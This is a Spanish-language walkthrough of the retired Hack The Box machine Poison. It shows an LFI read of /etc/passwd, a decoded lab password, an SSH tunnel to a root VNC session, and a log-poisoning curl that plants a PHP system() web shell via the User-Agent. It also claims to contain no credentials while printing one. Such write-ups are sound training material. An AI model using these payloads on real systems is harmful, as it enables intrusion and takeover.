---
machine: Poison
os: FreeBSD
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [freebsd, lfi, php, log-poisoning, vnc, tunneling]
---

# Poison — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Servidor **FreeBSD** con una **LFI** en `browse.php`. Un `pwdbackup.txt` codificado en base64 trece veces da la contraseña de `charix`; en su home hay un `secret.zip` con el fichero de contraseña de un **VNC que corre como root** en `127.0.0.1:5901`. Túnel SSH y `vncviewer` con ese fichero: escritorio de root.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp  http  Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
```

La web es una herramienta que lista ficheros. `whatweb` confirma Apache sobre FreeBSD y PHP 5.6.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
ssh charix@<IP>
```

En el home:

```bash
ls -la
unzip secret.zip        # pide la contraseña de charix
```

`secret` es un fichero de autenticación de VNC, no una contraseña en texto.

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

```bash
netstat -na -p tcp
ps -auwwx | grep -i vnc
```

```text
tcp4  0  0 127.0.0.1.5801  *.*  LISTEN
tcp4  0  0 127.0.0.1.5901  *.*  LISTEN
root  529  ... Xvnc :1 -auth /root/.Xauthority -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost
```

VNC escucha solo en loopback y corre como **root**. Se reenvía el puerto y se usa el fichero `secret` como credencial:

```bash
ssh -L 5901:127.0.0.1:5901 charix@<IP>
vncviewer 127.0.0.1:5901 -passwd secret
```

Dentro del escritorio se abre una terminal como root y se lee `/root/root.txt`.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- La LFI permite leer la aplicación y encontrar el fichero ofuscado; el base64 repetido es solo una capa, no cifrado.
- Un ZIP protegido con la misma contraseña del usuario no protege nada.
- VNC local como root es root: `-localhost` no sirve de nada si ya hay SSH.
- Detección: peticiones con rutas absolutas o `../` en `browse.php`, y túneles SSH hacia 5901.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)

## LFI

```bash
curl -s "http://<IP>/browse.php?file=/etc/passwd"
```

```text
root:*:0:0:Charlie &:/root:/bin/csh
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

El directorio web contiene `pwdbackup.txt`, con la contraseña codificada en base64 **trece veces**:

```bash
for i in $(seq 13); do echo "$(cat pwdbackup.txt)" | base64 -d > paso$i; mv paso$i pwdbackup.txt; done
cat pwdbackup.txt
```

```text
Charix!2#4%6&8(0
```

RCE opcional por envenenamiento de logs: la LFI permite incluir el log de Apache y ejecutar lo que se escriba en él.

```bash
curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "http://<IP>/browse.php?file=/var/log/httpd-access.log&c=id"
```
